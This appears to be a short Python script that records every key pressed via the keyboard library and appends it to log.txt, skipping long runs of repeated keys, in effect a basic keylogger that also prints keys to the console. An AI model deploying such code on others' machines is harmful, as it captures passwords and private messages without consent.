import keyboard
from time import time

sTime = int(time())
lastkey = ""
i = 0
while True:
    f = open('log.txt', 'a+')
    key = keyboard.read_key()
    event = keyboard.read_event()
    if event.event_type == "down" and key == lastkey:
        i += 1
    else:
        i = 0
    if i < 5:
        print(key)
        f.write(key+" ")
        f.close()
    lastkey = key